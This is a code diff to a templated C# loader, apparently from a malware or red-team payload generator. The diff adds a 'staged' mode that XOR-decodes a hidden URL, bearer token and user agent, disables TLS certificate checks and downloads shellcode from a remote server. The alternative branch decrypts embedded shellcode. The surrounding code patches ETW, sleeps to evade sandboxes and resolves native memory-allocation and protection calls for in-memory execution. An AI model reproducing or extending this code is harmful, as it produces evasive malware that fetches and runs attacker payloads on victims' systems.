@@ -138,9 +138,36 @@
                 {{ v.fn_etw }}({{ v.mb_lv_ex_ntdll }});
                 Thread.Sleep(2000 + new Random().Next(3000));
 
+                {%- if is_staged %}
+                byte[] {{ sg.sg_lv_url }} = new byte[]{ {% for b in staged_url_enc %}{{ b }},{% endfor %} };
+                for (int {{ sg.sg_lv_i }} = 0; {{ sg.sg_lv_i }} < {{ sg.sg_lv_url }}.Length; {{ sg.sg_lv_i }}++) {{ sg.sg_lv_url }}[{{ sg.sg_lv_i }}] ^= (byte){{ staged_url_xk }};
+                byte[] {{ sg.sg_lv_jwt }} = new byte[]{ {% for b in staged_jwt_enc %}{{ b }},{% endfor %} };
+                for (int {{ sg.sg_lv_i }} = 0; {{ sg.sg_lv_i }} < {{ sg.sg_lv_jwt }}.Length; {{ sg.sg_lv_i }}++) {{ sg.sg_lv_jwt }}[{{ sg.sg_lv_i }}] ^= (byte){{ staged_jwt_xk }};
+                byte[] {{ sg.sg_lv_ua }} = new byte[]{ {% for b in staged_ua_enc %}{{ b }},{% endfor %} };
+                for (int {{ sg.sg_lv_i }} = 0; {{ sg.sg_lv_i }} < {{ sg.sg_lv_ua }}.Length; {{ sg.sg_lv_i }}++) {{ sg.sg_lv_ua }}[{{ sg.sg_lv_i }}] ^= (byte){{ staged_ua_xk }};
+                byte[] {{ v.mb_lv_ex_sc }};
+                try {
+                    System.Net.ServicePointManager.ServerCertificateValidationCallback = (a,b,c,d) => true;
+                    System.Net.ServicePointManager.SecurityProtocol =
+                        (System.Net.SecurityProtocolType)3072 | (System.Net.SecurityProtocolType)768;
+                    var {{ sg.sg_lv_req }} = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(
+                        System.Text.Encoding.ASCII.GetString({{ sg.sg_lv_url }}));
+                    {{ sg.sg_lv_req }}.Method = "GET";
+                    {{ sg.sg_lv_req }}.UserAgent = System.Text.Encoding.ASCII.GetString({{ sg.sg_lv_ua }});
+                    {{ sg.sg_lv_req }}.Headers["Authorization"] = "Bearer " + System.Text.Encoding.ASCII.GetString({{ sg.sg_lv_jwt }});
+                    using (var {{ sg.sg_lv_resp }} = ({{ sg.sg_lv_req }}.GetResponse() as System.Net.HttpWebResponse))
+                    using (var {{ sg.sg_lv_buf }} = new System.IO.MemoryStream()) {
+                        if ((int){{ sg.sg_lv_resp }}.StatusCode != 200) return false;
+                        {{ sg.sg_lv_resp }}.GetResponseStream().CopyTo({{ sg.sg_lv_buf }});
+                        {{ v.mb_lv_ex_sc }} = {{ sg.sg_lv_buf }}.ToArray();
+                    }
+                } catch { return false; }
+                for (int {{ sg.sg_lv_i }} = 0; {{ sg.sg_lv_i }} < {{ sg.sg_lv_jwt }}.Length; {{ sg.sg_lv_i }}++) {{ sg.sg_lv_jwt }}[{{ sg.sg_lv_i }}] = 0;
+                {%- else %}
                 byte[] {{ v.mb_lv_ex_k }} = {{ v.fn_hex }}({% for chunk in key_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %});
                 for (int {{ v.mb_lv_ex_ki }} = 0; {{ v.mb_lv_ex_ki }} < {{ v.mb_lv_ex_k }}.Length; {{ v.mb_lv_ex_ki }}++) {{ v.mb_lv_ex_k }}[{{ v.mb_lv_ex_ki }}] ^= (byte){{ key_tweak }};
                 byte[] {{ v.mb_lv_ex_sc }} = {{ v.fn_decrypt }}({{ v.fn_hex }}({% for chunk in shellcode_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %}), {{ v.mb_lv_ex_k }});
+                {%- endif %}
 
                 byte[] {{ v.mb_lv_ex_allocn }} = {{ v.mb_fn_n }}(new int[]{ {{ v.jsc_nt_alloc_vm }} });
                 byte[] {{ v.mb_lv_ex_protn }}  = {{ v.mb_fn_n }}(new int[]{ {{ v.jsc_nt_prot_vm }} });
